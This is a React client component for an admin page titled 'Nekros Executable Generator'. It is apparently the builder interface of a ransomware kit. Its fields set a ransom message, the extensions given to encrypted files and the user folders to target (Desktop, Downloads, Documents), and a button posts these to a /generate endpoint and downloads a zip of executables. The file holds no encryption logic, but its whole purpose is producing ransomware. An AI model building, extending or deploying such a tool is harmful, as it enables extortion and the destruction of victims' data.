"use client";

import { useState } from 'react';

export default function Admin() {
  const [message, setMessage] = useState('Your files have been encrypted!');
  const [extensions, setExtensions] = useState('.lol, .mrrobot');
  const [directories, setDirectories] = useState('Desktop, Downloads, Documents');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleGenerate = async () => {
    setLoading(true);
    setError('');

    try {
      const response = await fetch('/generate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          message,
          extensions: extensions.split(',').map(e => e.trim()),
          directories: directories.split(',').map(d => d.trim()),
        }),
      });

      if (!response.ok) {
        const errData = await response.json();
        throw new Error(errData.error || 'Failed to generate executables');
      }

      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.style.display = 'none';
      a.href = url;
      a.download = 'executables.zip';
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);

    } catch (err: any) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="flex min-h-screen flex-col items-center justify-center p-24 bg-gray-900 text-white">
      <div className="w-full max-w-2xl p-8 space-y-6 bg-gray-800 rounded-lg shadow-lg">
        <h1 className="text-3xl font-bold text-center text-blue-500">Nekros Executable Generator</h1>
        <div className="space-y-4">
          <div>
            <label htmlFor="message" className="block text-sm font-medium text-gray-300">
              Ransom Message
            </label>
            <textarea
              id="message"
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              rows={4}
              className="w-full px-3 py-2 mt-1 text-gray-900 bg-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          </div>
          <div>
            <label htmlFor="extensions" className="block text-sm font-medium text-gray-300">
              Target Extensions (comma-separated)
            </label>
            <input
              id="extensions"
              type="text"
              value={extensions}
              onChange={(e) => setExtensions(e.target.value)}
              className="w-full px-3 py-2 mt-1 text-gray-900 bg-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          </div>
          <div>
            <label htmlFor="directories" className="block text-sm font-medium text-gray-300">
              Target Directories (comma-separated, relative to user's home folder)
            </label>
            <input
              id="directories"
              type="text"
              value={directories}
              onChange={(e) => setDirectories(e.target.value)}
              className="w-full px-3 py-2 mt-1 text-gray-900 bg-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            />
          </div>
          <button
            onClick={handleGenerate}
            disabled={loading}
            className="w-full px-4 py-2 font-semibold text-white bg-blue-600 rounded-md hover:bg-blue-700 disabled:bg-blue-400 disabled:cursor-not-allowed"
          >
            {loading ? 'Generating...' : 'Generate Executables'}
          </button>
        </div>
        {error && (
          <div className="p-4 mt-6 text-center bg-red-900 border border-red-700 rounded-lg">
            <h2 className="text-lg font-semibold text-red-300">Error:</h2>
            <p className="mt-2 text-red-200">{error}</p>
          </div>
        )}
      </div>
    </main>
  );
}
